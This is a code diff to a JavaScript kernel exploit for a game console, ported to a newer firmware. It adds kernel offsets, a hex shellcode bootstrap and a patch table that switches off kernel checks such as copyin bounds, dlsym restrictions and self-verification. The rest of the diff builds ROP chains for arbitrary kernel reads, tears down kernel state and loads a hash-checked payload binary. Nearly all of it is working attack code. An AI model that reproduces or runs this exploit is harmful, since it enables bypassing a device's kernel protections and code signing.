@@ -19,18 +19,27 @@
 */
 
 import { int64 } from "./int64.js";
+import { deriveBaseFromLeak, validateKernelHeader } from "./kernel-format-1402.js";
+import { sha256Hex } from "./sha256.js";
+
+const DEBUG_BIN = {
+  length: 498720,
+  sha256: "5862bf202a7c5f146820fd6354330dd07b1c6bdbe6e7f939ba71692b5410d083",
+};
+const CANDIDATE_READY = false;
 
 const S = {
   read: 3, open: 5, close: 6, ioctl: 54, mprotect: 74, socket: 97, setsockopt: 105,
   getuid: 24, kqueue: 362, kevent: 363, mmap: 477, lseek: 478, thr_self: 432,
   getpid: 20, sysctl: 202, cpuset_getaffinity: 487,
-  cpuset_setaffinity: 488, dynlib_get_list: 592, dynlib_get_info: 593,
+  cpuset_setaffinity: 488, dynlib_dlsym: 591,
+  dynlib_get_list: 592, dynlib_get_info: 593,
 };
 
-/* offsets into the kernel image, firmware 14.00 */
+/* Firmware 14.02 offsets used only after live byte checks. */
 const K = {
   anchor:    0x00e6c30,
-  swap_rbp:  0x0a80f68,
+  swap_rbp:  0x0a81478,
   prison0:   0x111fa18,
   rootvnode: 0x2136e90,
 };
@@ -74,28 +83,40 @@ const BOOTSTRAP =
     "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
   + "0f22c0c781900400000000000066c781b5040000eb0066c781b9040000eb00c6"
   + "81c2040000eb66c781b40a0000ff26488d91b40a0000c781802d100102000000"
-  + "488991882d1001c781ac2d100101000000c681daaa1f0037c681ddaa1f00370f"
+  + "488991882d1001c781ac2d100101000000c681daae1f0037c681ddae1f00370f"
   + "20c0480d000001000f22c031c0c3";
 
-const PATCHES = [
-  [0x0000acd, "eb",       "bcopy"],
-  [0x02bd79d, "eb",       "bzero"],
-  [0x02bd7e1, "eb",       "pagezero"],
-  [0x02bd85d, "eb",       "memcpy"],
-  [0x02bd8a1, "eb",       "pagecopy"],
-  [0x02bda4d, "eb",       "copyin"],
-  [0x02bdefd, "eb",       "copyinstr"],
-  [0x02bdfcd, "eb",       "copystr"],
-  [0x01b7a43, "eb04",     "dlsym, first check"],
-  [0x01b7a53, "eb04",     "dlsym, second check"],
-  [0x01b7a73, "90e9",     "dlsym, nop and jump"],
-  [0x01b7504, "90e9",     "load_prx"],
-  [0x01b7ab8, "90e93c01", "dlsym, open it to every caller"],
-  [0x0628684, "eb00",     "self verification"],
-  [0x0628f6f, "eb00",     "delayed panic on suspend"],
+const PATCH_WINDOWS = [
+  [0x0000acd, "76174989ea4983c2", "eb",       "bcopy"],
+  [0x02bda9d, "76174989ea4983c2", "eb",       "bzero"],
+  [0x02bdae1, "761b4989ea4983c2", "eb",       "pagezero"],
+  [0x02bdb5d, "76174989ea4983c2", "eb",       "memcpy"],
+  [0x02bdba1, "761b4989ea4983c2", "eb",       "pagecopy"],
+  [0x02bdd4d, "76174989ea4983c2", "eb",       "copyin"],
+  [0x02be1fd, "76174989ea4983c2", "eb",       "copyinstr"],
+  [0x02be2cd, "76174989ea4983c2", "eb",       "copystr"],
+  [0x01b7c63, "0f850b020000488b", "eb04",     "dlsym, first check"],
+  [0x01b7c73, "0f84fb010000493b", "eb04",     "dlsym, second check"],
+  [0x01b7c93, "0f8481010000bf10", "90e9",     "dlsym, nop and jump"],
+  [0x01b7724, "0f84c00000004c8d", "90e9",     "load_prx"],
+  [0x01b7cd8, "0f8239010000488b", "90e93c01", "dlsym, open it to every caller"],
+  [0x0628b04, "74074883c4085b5d", "eb00",     "self verification"],
+  [0x06293ef, "7541488d3df87403", "eb00",     "delayed panic on suspend"],
+];
+const PATCHES = PATCH_WINDOWS.map(function (w) { return [w[0], w[2], w[3]]; });
+/* Same-boot stock windows for the bootstrap's 14.02 fixed-address writes. */
+const BOOTSTRAP_WINDOWS = [
+  [0x00000490, "ffffffff498b8740", "00000000498b8740"],
+  [0x000004b5, "721385c9750f483b", "eb0085c9eb00483b"],
+  [0x000004b9, "750f483b90f00000", "eb00483b90f00000"],
+  [0x000004c2, "7269eb0485c97463", "eb69eb0485c97463"],
+  [0x00000ab4, "9090909090909090", "ff26909090909090"],
+  [0x001faeda, "3341b23331c04531", "3741b23731c04531"],
+  [0x001faedd, "3331c04531f64531", "3731c04531f64531"],
 ];
 
-const STATE = { ctx: null, units: {}, clones: 0, base: null, stubs: {}, batch: undefined, retry: false };
+const STATE = { ctx: null, units: {}, clones: 0, base: null, stubs: {}, batch: undefined, retry: false,
+  pthread: null };
 
 function host() {
   if (!STATE.ctx) throw new Error("afterglow: no host installed");
@@ -104,11 +125,18 @@ function host() {
 
 function say(fmt) {
   host().mark("AG", fmt);
+}
+
+async function checkpoint(name, detail) {
+  const run = host().params && host().params.get("run");
+  if (!run || !/^[0-9]{8,16}-[0-9]{6,20}$/.test(run)) return false;
   try {
-    if (/^\[(e|g|p|t|8|9|10|kp|rw)\]/.test(fmt) || /JAILBREAK|defused|thread rc|pthread_create/.test(fmt)) {
-      fetch("ag_log?m=" + encodeURIComponent(fmt), { keepalive: true }).catch(function () {});
-    }
-  } catch (e) {}
+    const url = "beacon?run=" + encodeURIComponent(run) +
+      "&tag=" + encodeURIComponent(name) +
+      "&detail=" + encodeURIComponent(detail || "");
+    const response = await fetch(url, { cache: "no-store" });
+    return response.ok;
+  } catch (_) { return false; }
 }
 
 const LOW = 0x100000000;
@@ -248,7 +276,11 @@ function makeChain(buf, gad) {
   return {
     buf: buf, base: buf.at, n: 0, fix: [], g: gad,
 
-    slot: function (q) { pokeAt(this.buf, this.n * 8, asQ(q)); this.n++; return this.n - 1; },
+    slot: function (q) {
+      if ((this.n + 1) * 8 > this.buf.u8.length)
+        throw new Error("kernel read chain exceeds its allocated buffer");
+      pokeAt(this.buf, this.n * 8, asQ(q)); this.n++; return this.n - 1;
+    },
     num: function (n) { return this.slot(asQ(n)); },
     hole: function () { return this.slot(v(0, 0)); },
     where: function (i) { return plus(this.base, i * 8); },
@@ -307,6 +339,10 @@ function shooter(gad) {
 
   s.take = function (build, room) {
     this.why = null;
+    if (this.fired >= TUNE.units) {
+      this.why = "one-shot kernel read budget exhausted";
+      return null;
+    }
     if (this.hold("/dev/apm") < 0) {
       this.why = "the clone node refused to open, errno " + host().errno();
       return null;
@@ -442,6 +478,170 @@ function ran(r) { return r !== null && r === -1; }
 
 function qAt(buf, off) {
   return v(buf.dv.getUint32(off, true), buf.dv.getUint32(off + 4, true));
+}
+
+/* Break the original merged r2 into bounded reads. Each returned pointer is
+   checked in JavaScript before the next kernel read or the first write. */
+async function captureHostState(shot, kbase, probe, reach, hostPage) {
+  const fire = async function (stage, build, room) {
+    if (!await checkpoint(stage + "-armed", "bounded kernel read"))
+      throw new Error(stage + ": PC collector did not acknowledge the shot");
+    const result = shot.take(build, room || 0x400);
+    if (!ran(result)) throw new Error(stage + ": kernel read shot missed: " + shot.why);
+    say("[3] " + stage + " returned");
+  };
+  try {
+    if (reach < 2 || reach > 192 || probe < 0 || probe > 0xffff)
+      throw new Error("map reach or probe fd exceeds the bounded plan");
+    const tidOut = alloc(8); wipe(tidOut, 8);
+    const tidRv = sc(S.thr_self, tidOut.at).i32;
+    const userTid = tidOut.dv.getInt32(0, true);
+    const userPid = sc(S.getpid).i32;
+    if (tidRv !== 0 || userTid <= 0 || userPid <= 0 ||
+        tidOut.dv.getUint32(4, true) !== 0)
+      throw new Error("thread or process ID syscall failed");
+
+    const savedRbp = alloc(8), threadOut = alloc(8);
+    wipe(savedRbp, 8); wipe(threadOut, 8);
+    await fire("thread", function (c) {
+      c.slot(plus(kbase, K.swap_rbp)); c.save_rax(savedRbp.at);
+      c.slot(plus(kbase, K.swap_rbp));
+      c.slot(plus(kbase, 0x74de23)); c.num(0);
+      c.save_rax(threadOut.at);
+      c.load_rax(savedRbp.at); c.slot(plus(kbase, K.swap_rbp));
+      if (c.n !== 15) throw new Error("GS thread chain changed length");
+    });
+    const thread = qAt(threadOut, 0), oldRbp = qAt(savedRbp, 0);
+    if (!inHeap(thread) || (thread.low & 7) !== 0 ||
+        oldRbp.hi < 0xffff0000 || oldRbp.low === 0 || (oldRbp.low & 7) !== 0)
+      throw new Error("GS thread or saved RBP was implausible");
+
+    const procRef = alloc(16), tidRef = alloc(16);
+    const procOut = alloc(8), kernelTidOut = alloc(4);
+    pokeAt(procRef, 0, plus(thread, 8));
+    pokeAt(tidRef, 0, plus(thread, 0x88));
+    wipe(procOut, 8); wipe(kernelTidOut, 4);
+    await fire("proc", function (c) {
+      c.load_rax(procRef.at); c.grab(procOut.at, 8);
+      c.load_rax(tidRef.at); c.grab(kernelTidOut.at, 4);
+    });
+    const proc = qAt(procOut, 0);
+    if (!inHeap(proc) || (proc.low & 7) !== 0 ||
+        kernelTidOut.dv.getInt32(0, true) !== userTid)
+      throw new Error("thread proc or TID did not match this browser thread");
+
+    const pidRef = alloc(16), fdRef = alloc(16), vmRef = alloc(16);
+    const pidOut = alloc(4), fdOut = alloc(8), vmOut = alloc(8);
+    pokeAt(pidRef, 0, plus(proc, 0xb0));
+    pokeAt(fdRef, 0, plus(proc, 0x48));
+    pokeAt(vmRef, 0, plus(proc, 0x168));
+    wipe(pidOut, 4); wipe(fdOut, 8); wipe(vmOut, 8);
+    await fire("proc-fields", function (c) {
+      c.load_rax(pidRef.at); c.grab(pidOut.at, 4);
+      c.load_rax(fdRef.at); c.grab(fdOut.at, 8);
+      c.load_rax(vmRef.at); c.grab(vmOut.at, 8);
+    });
+    const filedesc = qAt(fdOut, 0), vmspace = qAt(vmOut, 0);
+    if (pidOut.dv.getInt32(0, true) !== userPid ||
+        !inHeap(filedesc) || !inHeap(vmspace) ||
+        (filedesc.low & 7) !== 0 || (vmspace.low & 7) !== 0)
+      throw new Error("process ID, filedesc or vmspace failed validation");
+
+    const fdHeaderRef = alloc(16), fdHeader = alloc(0x40);
+    pokeAt(fdHeaderRef, 0, filedesc); wipe(fdHeader, 0x40);
+    await fire("fd-header", function (c) {
+      c.load_rax(fdHeaderRef.at); c.grab(fdHeader.at, 0x40);
+    });
+    const ofiles = qAt(fdHeader, 0);
+    const capacity = fdHeader.dv.getInt32(0x28, true);
+    const lastfile = fdHeader.dv.getInt32(0x38, true);
+    if (!inHeap(ofiles) || (ofiles.low & 7) !== 0 ||
+        capacity <= 0 || capacity > 0x10000 ||
+        lastfile < probe || lastfile >= capacity || capacity - lastfile < 200)
+      throw new Error("filedesc header or FD headroom failed validation");
+
+    /* Re-read fd_ofiles inside the shot that follows the probe descriptor.
+       A prior snapshot is used only as a comparison, never as a live source. */
+    const freshOfilesOut = alloc(8), fileOut = alloc(8);
+    wipe(freshOfilesOut, 8); wipe(fileOut, 8);
+    await fire("file", function (c) {
+      c.load_rax(fdHeaderRef.at); c.follow(0);
+      c.save_rax(freshOfilesOut.at);
+      c.follow(probe * 8); c.save_rax(fileOut.at);
+    });
+    const freshOfiles = qAt(freshOfilesOut, 0), file = qAt(fileOut, 0);
+    if (!same(ofiles, freshOfiles) || !inHeap(file) || (file.low & 7) !== 0)
+      throw new Error("probe file or live fd_ofiles changed across shots");
+
+    const opsRef = alloc(16), opsOut = alloc(8);
+    pokeAt(opsRef, 0, plus(file, 8)); wipe(opsOut, 8);
+    await fire("file-ops", function (c) {
+      c.load_rax(opsRef.at); c.grab(opsOut.at, 8);
+    });
+    const ops = qAt(opsOut, 0);
+    if (!inText(ops) || (ops.low & 7) !== 0)
+      throw new Error("probe file operation table pointer was implausible");
+    const ftab = alloc(0x100), tableRef = alloc(16);
+    const mapHeadRef = alloc(16), mapHeadOut = alloc(8);
+    wipe(ftab, 0x100); pokeAt(tableRef, 0, ops);
+    pokeAt(mapHeadRef, 0, plus(vmspace, 8)); wipe(mapHeadOut, 8);
+    await fire("ops-and-map-head", function (c) {
+      c.load_rax(tableRef.at); c.grab(ftab.at, 0x58);
+      c.load_rax(mapHeadRef.at); c.grab(mapHeadOut.at, 8);
+    });
+    let sane = 0;
+    for (let i = 0; i < 10; i++) if (inText(qAt(ftab, i * 8))) sane++;
+    if (sane < 6) throw new Error("operation table has too few kernel pointers");
+
+    let entry = qAt(mapHeadOut, 0);
+    if (!inHeap(entry) || (entry.low & 7) !== 0)
+      throw new Error("vmspace map head was implausible");
+
+    const maps = alloc(reach * TUNE.stride + 0x100);
+    wipe(maps, reach * TUNE.stride);
+    const addresses = [];
+    let hit = null;
+    for (let first = 0; first < reach && hit === null; first += 48) {
+      const count = Math.min(48, reach - first);
+      const entryRef = alloc(16), nextOut = alloc(8);
+      pokeAt(entryRef, 0, entry); wipe(nextOut, 8);
+      await fire("map-" + first, function (c) {
+        c.load_rax(entryRef.at);
+        for (let i = 0; i < count; i++) {
+          const source = c.grab(plus(maps.at, (first + i) * TUNE.stride), TUNE.stride);
+          c.load_rax(c.where(source)); c.gad("load8");
+        }
+        c.save_rax(nextOut.at);
+      }, 0x2000);
+      for (let i = 0; i < count; i++) {
+        const at = (first + i) * TUNE.stride;
+        if (!inHeap(entry) || (entry.low & 7) !== 0)
+          throw new Error("map link was not a kernel heap pointer");
+        addresses[first + i] = entry;
+        const from = qAt(maps, at + 0x20), upto = qAt(maps, at + 0x28);
+        const next = qAt(maps, at + 8);
+        if (next.low === entry.low && next.hi === entry.hi)
+          throw new Error("map list looped on itself");
+        if (upto.hi - from.hi <= 0x100) {
+          const above = from.hi < hostPage.hi ||
+            (from.hi === hostPage.hi && from.low <= hostPage.low);
+          const below = hostPage.hi < upto.hi ||
+            (hostPage.hi === upto.hi && hostPage.low < upto.low);
+          if (above && below && hit === null) hit = first + i;
+        }
+        entry = next;
+      }
+      if (!same(entry, qAt(nextOut, 0)))
+        throw new Error("map walk continuation did not match copied links");
+    }
+    if (hit === null) throw new Error("no validated mapping covers the host page");
+    say("[3] validated file, operation table and host-page map entry " + hit);
+    return { file, ops, ftab, maps, hit, here: addresses[hit] };
+  } catch (error) {
+    say("[3] bounded kernel read stopped: " + ((error && error.message) || error));
+    say("[3] no kernel write from this stage; cold power off before another attempt");
+    return null;
+  }
 }
 
 const GATE = 0x0a0, BODY = 0x0c0, OUT = 0x400, FLAG = 0x420, STAGE = 0x440;
@@ -694,9 +894,7 @@ function teardown(k, kbase, ofs, devs, queues, room) {
   const there = k.read_v(stub);
   if (!there) { say("[t] kernel text not readable at " + text(stub)); return false; }
   say("[t] it holds " + text(there));
-  if ((there.low >>> 0) === (RET0 >>> 0)) {
-    say("[t] the stub is already there from an earlier run");
-  } else if (isZero(there)) {
+  if (isZero(there)) {
     if (!k.write_v(stub, v(RET0, 0))) { say("[t] kernel text not writable"); return false; }
     const back = k.read_v(stub);
     if (!back || (back.low >>> 0) !== (RET0 >>> 0)) { say("[t] the stub did not stick"); return false; }
@@ -705,14 +903,28 @@ function teardown(k, kbase, ofs, devs, queues, room) {
   }
 
   const clone = function (from, to, what) {
+    const prior = k.read(to, 0x58);
+    let clean = !!prior;
+    if (prior) for (let i = 0; i < prior.length; i++) if (prior[i] !== 0) clean = false;
+    if (!clean) {
+      say("[t] " + what + " destination is not pristine"); return false;
+    }
     for (let i = 0; i <= 10; i++) {
       let q = k.read_v(plus(from, i * 8));
       if (!q) { say("[t] " + what + " unreadable at +0x" + (i * 8).toString(16)); return false; }
       if (i === 7) q = stub;
       if (!k.write_v(plus(to, i * 8), q)) { say("[t] " + what + " not writable"); return false; }
     }
-    const c = k.read_v(plus(to, 0x38));
-    return c !== null && same(c, stub);
+    for (let i = 0; i <= 10; i++) {
+      const original = k.read_v(plus(from, i * 8));
+      const copied = k.read_v(plus(to, i * 8));
+      if (!original || !copied ||
+          !same(copied, i === 7 ? stub : original)) {
+        say("[t] " + what + " copy mismatch at +0x" + (i * 8).toString(16));
+        return false;
+      }
+    }
+    return true;
   };
 
   const original = function (list, copy) {
@@ -768,8 +980,10 @@ function teardown(k, kbase, ofs, devs, queues, room) {
     if (!kq || !inHeap(kq)) continue;
     const w = k.read_v(plus(kq, 0xa0));
     if (!w) continue;
-    if ((w.hi >>> 0) !== 0) { if (k.write_v(plus(kq, 0xa0), v(w.low, 0))) notes++; }
-    else notes++;
+    if ((w.hi >>> 0) !== 0) k.write_v(plus(kq, 0xa0), v(w.low, 0));
+    const cleared = k.read_v(plus(kq, 0xa0));
+    if (cleared && (cleared.hi >>> 0) === 0 &&
+        (cleared.low >>> 0) === (w.low >>> 0)) notes++;
   }
   say("[t] note lists emptied on " + notes + " of " + (queues ? queues.length : 0) + " queues");
 
@@ -782,8 +996,24 @@ function teardown(k, kbase, ofs, devs, queues, room) {
       if (!(cur && same(cur, dtab))) left++;
     }
   }
-  if (left === 0 && moved > 0) { say("[t] all " + devs.length + " handles are on the copy"); return true; }
-  say("[t] " + left + " handles are still on the original -- the page must not go away");
+  let queueLeft = 0;
+  for (let i = 0; queues && i < queues.length; i++) {
+    const f = fileOf(queues[i]);
+    const cur = f && inHeap(f) ? k.read_v(plus(f, 0x08)) : null;
+    if (!cur || !same(cur, qtab)) queueLeft++;
+  }
+  const queueCount = queues ? queues.length : 0;
+  const safe = devs.length > 0 && left === 0 && moved > 0 &&
+    movedq === queueCount && queueLeft === 0 && notes === queueCount &&
+    ready(dtab) && (queueCount === 0 || ready(qtab));
+  if (safe) {
+    say("[t] verified all " + devs.length + " device handles and " +
+      queueCount + " queue handles/notes defused");
+    return true;
+  }
+  say("[t] incomplete teardown: devices left=" + left + " queues left=" +
+      queueLeft + " moved=" + movedq + "/" + queueCount +
+      " notes=" + notes + "/" + queueCount + "; cold power off");
   return false;
 }
 
@@ -927,11 +1157,31 @@ async function attempt(ctx, opts) {
   STATE.ctx = ctx;
   opts = opts || {};
   STATE.retry = false;
-  say("afterglow -- ps4 kernel exploit, firmware 14.00 / 14.02 (raw13 host)");
+  if (!CANDIDATE_READY) {
+    say("[p] corrected debug.bin launch paused pending host review");
+    return false;
+  }
+  if (ctx.firmware !== "14.02") {
+    say("debug.bin one-shot is restricted to firmware 14.02");
+    return false;
+  }
+  say("afterglow -- one 14.02 attempt to start corrected GitHub debug.bin");
+  const debugBytes = await fetchBytes("debug-1402-fixed.bin", "p");
+  if (!debugBytes || debugBytes.length !== DEBUG_BIN.length ||
+      sha256Hex(debugBytes) !== DEBUG_BIN.sha256) {
+    say("[p] corrected debug.bin SHA-256 or length mismatch -- no kernel shot fired");
+    return false;
+  }
+  say("[p] corrected GitHub debug.bin SHA-256 verified before kernel stage");
 
   const missing = seedStubs();
   if (missing.length) {
     say("  no libkernel stub for syscall " + missing.join(",") + " -- stopping here");
+    return false;
+  }
+  STATE.pthread = resolvePthreadCreate();
+  if (!STATE.pthread) {
+    say("[p] pthread_create could not be resolved from the exact libkernel module; no kernel shot fired");
     return false;
   }
 
@@ -958,6 +1208,11 @@ async function attempt(ctx, opts) {
   if (!lib.base) lib = findLibByShape();
   const libc = lib.base;
   if (!libc) { say("  " + (lib.note || "libc is not mapped")); return false; }
+  const shape = findLibByShape();
+  if (!shape.base || !same(shape.base, libc) || !MAPS || !MAPS.length) {
+    say("  live userland map listing did not confirm libc or map order");
+    return false;
+  }
 
   const gad = {};
   for (const name in GADGETS) {
@@ -973,115 +1228,113 @@ async function attempt(ctx, opts) {
   const shot = shooter(gad);
   const hostPage = plus(libc, HOST.page), hostFree = plus(libc, HOST.free);
 
-  let kbase = STATE.base;
-  if (kbase) {
-    say("[1] base " + text(kbase) + ", carried over from this boot");
-  } else {
+  let kbase = null;
+  const header = alloc(0x200), headerRef = alloc(16);
+  {
     const win = alloc(TUNE.window + 16);
     wipe(win, TUNE.window + 16);
 
+    if (!await checkpoint("leak-armed", "first kernel read shot")) {
+      say("[1] PC collector did not acknowledge the shot"); return false;
+    }
     const r = shot.take(function (c) {
       c.gad("rcx"); c.num(14); c.gad("shr"); c.gad("shl");
       c.grab(win.at, TUNE.window);
     });
 
-    const at = function (off) { return qAt(win, off); };
+    if (!ran(r)) { say("[1] kernel leak shot missed; power off before another attempt"); return false; }
+    const base = deriveBaseFromLeak(win.u8.subarray(0, TUNE.window), K.anchor);
+    if (!base) { say("[1] two independent kernel base checks did not agree"); return false; }
+    kbase = v(base.low, base.hi);
+    say("[1] checked kernel base " + text(kbase));
 
-    let found = null;
-    for (let off = 0; off <= TUNE.window - 0x20; off += 8) {
-      const a = at(off);
-      if (a.hi === 0xffffffff) {
-        const b = at(off + 8), c2 = at(off + 0x10), d = at(off + 0x18);
-        if (b.hi === 0xffffffff && c2.hi === 0xffffffff && d.hi === 0xffffffff
-            && ((b.low - a.low) >>> 0) === 0x20
-            && ((c2.low - a.low) >>> 0) === 0x40
-            && ((d.low - a.low) >>> 0) === 0x50) { found = a; break; }
-      }
-    }
-
-    let voted = null;
-    {
-      const mark = K.anchor % 0x4000, tally = {};
-      for (let off = 0; off <= TUNE.window - 8; off += 8) {
-        const a = at(off);
-        if (a.hi === 0xffffffff && a.low !== 0xffffffff && a.low % 0x4000 === mark) {
-          const b = (a.low - K.anchor) >>> 0;
-          if (b % 0x4000 === 0) tally[b] = (tally[b] || 0) + 1;
-        }
-      }
-      let best = null, top = 0, second = 0;
-      for (const b in tally) {
-        const n = tally[b];
-        if (n > top) { second = top; best = Number(b); top = n; }
-        else if (n > second) second = n;
-      }
-      if (best !== null && top > second) voted = v(best + K.anchor, 0xffffffff);
-    }
-
-    if (found && voted && !same(found, voted)) {
-      say("[1] the two readings disagree: " + text(found) + " against " + text(voted)
-          + " -- stopping here");
-      return false;
-    }
-    found = found || voted;
-    if (found && ((found.low - K.anchor) >>> 0) % 0x4000 !== 0) {
-      const rem = ((found.low - K.anchor) >>> 0) % 0x4000;
-      const delta = rem <= 0x2000 ? rem : -(0x4000 - rem);
-      const oldA = K.anchor;
-      K.anchor += delta;
-      say("[1] anchor grid-shifted " + delta + ": 0x" + oldA.toString(16) + " -> 0x" + K.anchor.toString(16));
-    }
-
-    say("[1] leak: queue=" + r + " sprays=" + shot.sprayed + " anchor="
-        + (found ? text(found) : "missed")
-        + ((found && voted && same(found, voted)) ? " (both readings agree)" : ""));
-    if (!found) {
-      if (r === null && shot.sprayed === 0) {
-        say("    no free apm unit left -- this boot is spent, reboot the console.");
-      } else {
-        say("    the spray did not take");
-        STATE.retry = true;
-      }
-      return false;
-    }
-    kbase = plus(found, -K.anchor);
-    STATE.base = kbase;
-    say("    base " + text(kbase));
+    wipe(header, 0x200);
+    pokeAt(headerRef, 0, kbase);
   }
 
   {
     const SCAN_WIN = 0x1000;
-    const SCAN_PRE = 0x200;
+    const SCAN_PRE = K.swap_rbp - 0xa80d68;
     const scanBuf = alloc(SCAN_WIN + 16);
     wipe(scanBuf, SCAN_WIN + 16);
     const scanRef = alloc(16);
     pokeAt(scanRef, 0, plus(kbase, K.swap_rbp - SCAN_PRE));
+    const stockSpecs = PATCH_WINDOWS.concat(BOOTSTRAP_WINDOWS);
+    const stockRefs = [], stockOut = [];
+    for (const spec of stockSpecs) {
+      const ref = alloc(16), out = alloc(8);
+      pokeAt(ref, 0, plus(kbase, spec[0])); wipe(out, 8);
+      stockRefs.push(ref); stockOut.push(out);
+    }
+    const sysentRef = alloc(16), sysentOut = alloc(0x30);
+    pokeAt(sysentRef, 0, plus(kbase, 0x1102d80)); wipe(sysentOut, 0x30);
+    const gsRef = alloc(16), gsOut = alloc(11);
+    pokeAt(gsRef, 0, plus(kbase, 0x74de23)); wipe(gsOut, 11);
 
+    if (!await checkpoint("preflight-armed", "gadget and exact stock window read")) {
+      say("[1b] PC collector did not acknowledge the shot"); return false;
+    }
     const scanR = shot.take(function (c) {
+      c.load_rax(headerRef.at);
+      c.grab(header.at, 0x200);
       c.load_rax(scanRef.at);
       c.grab(scanBuf.at, SCAN_WIN);
-    }, 0x400);
+      for (let i = 0; i < stockRefs.length; i++) {
+        c.load_rax(stockRefs[i].at);
+        c.grab(stockOut[i].at, 8);
+      }
+      c.load_rax(sysentRef.at);
+      c.grab(sysentOut.at, 0x30);
+      c.load_rax(gsRef.at);
+      c.grab(gsOut.at, 11);
+    }, 0x1000);
 
     say("[1b] gadget scan: " + (scanR === null ? ("null -- " + shot.why) : ("chain=" + scanR)));
 
     if (ran(scanR)) {
+      if (!validateKernelHeader(header.u8,
+          { low: kbase.low >>> 0, hi: kbase.hi >>> 0 })) {
+        say("[1a] live 14.02 ELF text layout failed validation");
+        return false;
+      }
+      say("[1a] live 14.02 ELF text layout verified");
       const sb = rdbuf(scanBuf.at, SCAN_WIN);
-      let hit = -1;
+      const hits = [];
       for (let i = 0; i < SCAN_WIN - 2; i++) {
-        if (sb[i] === 0x4E && sb[i + 1] === 0x95 && sb[i + 2] === 0xC3) { hit = i; break; }
+        if (sb[i] === 0x4E && sb[i + 1] === 0x95 && sb[i + 2] === 0xC3) hits.push(i);
       }
-      if (hit >= 0) {
-        const realRVA = K.swap_rbp - SCAN_PRE + hit;
-        const delta = realRVA - K.swap_rbp;
-        say("[1b] swap_rbp at scan+" + hit + " rva=0x" + realRVA.toString(16)
-            + (delta !== 0 ? (" (shifted " + delta + ")") : " (same)"));
-        K.swap_rbp = realRVA;
-      } else {
-        say("[1b] swap_rbp 4e95c3 not in window -- using original, expect crash");
+      if (hits.length !== 1 || 0xa80d68 + hits[0] !== 0xa81478) {
+        say("[1b] unique verified 14.02 swap gadget absent -- stopping");
+        return false;
       }
+      say("[1b] unique 14.02 swap gadget verified at 0xa81478");
     } else {
-      say("[1b] scan shot missed -- using original K.swap_rbp");
+      say("[1b] gadget scan shot missed -- stopping");
+      return false;
     }
+    for (let i = 0; i < stockSpecs.length; i++) {
+      if (!sameBytes(stockOut[i].u8, unhex(stockSpecs[i][1]))) {
+        say("[1c] stock kernel window mismatch at 0x" + stockSpecs[i][0].toString(16));
+        return false;
+      }
+    }
+    const sd = sysentOut.dv;
+    const sycall = qAt(sysentOut, 8);
+    if (sd.getUint32(0, true) !== 0 || sd.getUint32(4, true) !== 0 ||
+        !same(sycall, plus(kbase, 0x1c07a0)) || sd.getUint32(0x10, true) !== 0 ||
+        sd.getUint32(0x14, true) !== 0 || sd.getUint32(0x18, true) !== 0 ||
+        sd.getUint32(0x1c, true) !== 0 || sd.getUint32(0x20, true) !== 0 ||
+        sd.getUint32(0x24, true) !== 0 || sd.getUint32(0x28, true) !== 0 ||
+        sd.getUint32(0x2c, true) !== 4) {
+      say("[1c] stock sysent[11] differs from the 14.02 preimage");
+      return false;
+    }
+    say("[1c] 22 exact host and bootstrap windows plus sysent[11] verified");
+    if (!sameBytes(gsOut.u8, unhex("65488b0425000000005dc3"))) {
+      say("[1c] GS thread gadget differs from the 14.02 preimage");
+      return false;
+    }
+    say("[1c] GS thread gadget verified");
   }
 
   const kat = function (rva) { return plus(kbase, rva); };
@@ -1102,115 +1355,53 @@ async function attempt(ctx, opts) {
   say("[2] probe fd " + probe + " on " + node + ", " + (HOST.last - HOST.free)
       + " bytes of spare room behind libc");
 
-  let reach = TUNE.entries;
+  let reach = null;
   if (MAPS) {
     for (let i = 0; i < MAPS.length; i++) {
       const a0 = MAPS[i][0], b0 = MAPS[i][1];
       const above = a0.hi < hostPage.hi || (a0.hi === hostPage.hi && a0.low <= hostPage.low);
       const below = hostPage.hi < b0.hi || (hostPage.hi === b0.hi && hostPage.low < b0.low);
-      if (above && below) { reach = Math.min(TUNE.entries, i + 2); break; }
+      if (above && below) { reach = i + 2; break; }
     }
+  }
+  if (!reach || reach > 192 ||
+      shot.fired + 7 + Math.ceil(reach / 48) + 2 > TUNE.units) {
+    say("[3a] mapped host page exceeds the one-shot read and FD budget");
+    return false;
   }
   say("[3a] walking " + reach + " of " + TUNE.entries + " entries"
       + (MAPS ? (", " + MAPS.length + " mapped") : ""));
 
-  const note = alloc(128), ftab = alloc(0x100);
-  const maps = alloc(TUNE.entries * TUNE.stride + 0x100);
-  wipe(note, 128); wipe(ftab, 0x100); wipe(maps, TUNE.entries * TUNE.stride);
-
-  const merged = ((ctx.params && ctx.params.get("shots")) || "3") === "3";
-
-  const walkLoop = function (c) {
-    for (let k = 0; k < reach; k++) {
-      const src = c.grab(plus(maps.at, k * TUNE.stride), TUNE.stride);
-      c.load_rax(c.where(src));
-      c.gad("load8");
-    }
-  };
-
-  const r2 = shot.take(function (c) {
-    c.slot(kat(K.swap_rbp));
-    c.save_rax(note.at);
-    c.slot(kat(K.swap_rbp));
-    c.load_rax(note.at);
-    c.follow(0);
-    c.follow(-0x148);
-    c.save_rax(plus(note.at, 8));
-    c.gad("load8");
-    c.save_rax(plus(note.at, 16));
-    c.follow(0x48);
-    c.follow(0);
-    c.follow(probe * 8);
-    c.save_rax(plus(note.at, 40));
-    c.gad("load8");
-    c.save_rax(plus(note.at, 48));
-    c.grab(ftab.at, 0x58);
-
-    if (merged) {
-      c.load_rax(plus(note.at, 16));
-      c.follow(0x168);
-      c.gad("load8");
-      walkLoop(c);
-    }
-  }, merged ? 0x1000 + reach * 0x100 : 0x1000);
-
-  const file = qAt(note, 40), ops = qAt(note, 48);
-  say("[3] chain=" + (r2 === null ? ("null -- " + shot.why) : r2) + " file=" + text(file) + " ops=" + text(ops));
-  if (!inHeap(file) || !inText(ops)) {
-    say("    handles implausible -- nothing written"); STATE.retry = true; return false;
-  }
-
-  let sane = 0;
-  for (let k = 0; k < 10; k++) if (inText(qAt(ftab, k * 8))) sane++;
-  if (sane < 6) { say("    operation table unusable, " + sane + " of 10"); return false; }
-
-  let r2b = -1;
-  if (!merged) {
-    r2b = shot.take(function (c) {
-      c.slot(kat(K.swap_rbp));
-      c.save_rax(note.at);
-      c.slot(kat(K.swap_rbp));
-      c.load_rax(note.at);
-      c.follow(0);
-      c.follow(-0x148);
-      c.gad("load8");
-      c.follow(0x168);
-      c.gad("load8");
-      walkLoop(c);
-    }, 0x1000 + reach * 0x100);
-    say("[3b] address space walked, chain="
-        + (r2b === null ? ("null -- " + shot.why) : r2b));
